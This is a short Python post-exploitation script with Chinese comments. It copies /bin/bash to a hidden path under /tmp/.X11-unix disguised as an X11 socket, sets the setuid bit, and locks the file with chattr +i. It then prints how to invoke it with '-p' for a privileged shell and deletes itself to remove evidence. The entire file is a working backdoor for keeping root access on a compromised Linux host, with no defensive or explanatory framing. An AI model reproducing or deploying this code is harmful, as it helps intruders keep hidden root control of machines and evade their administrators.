# coding=utf-8
# !/usr/bin/env python
from __future__ import print_function
import subprocess
import sys, os


def ml(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    process.wait()  # 等待子进程完成

    stdout, stderr = process.communicate()  # 获取子进程的输出和错误
    try:
        decoded_stdout = stdout.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stdout = stdout.decode('latin1')
    try:
        decoded_stderr = stderr.decode('utf-8')
    except UnicodeDecodeError:
        decoded_stderr = stderr.decode('latin1')
    return decoded_stdout


def delbash(bash):
    try:
        ml('chattr -i ' + bash)
    except Exception:
        pass


def chakbanh(bash):
    if os.path.exists(bash):
        print('文件写入成')
        print('低权限运行: ' + bash + ' -p')


def delete_current_script():
    try:
        script_path = os.path.abspath(sys.argv[0])
        os.remove(script_path)
        print("当前脚本文件已成功删除" + script_path)
    except Exception as e:
        print("无法删除当前脚本文件：", e)


if __name__ == '__main__':
    bash = '/tmp/.X11-unix/shell'
    delbash(bash)
    ml('cp /bin/bash ' + bash)
    ml('chmod u+s ' + bash)
    ml('chattr +i ' + bash)
    chakbanh(bash)
    delete_current_script()
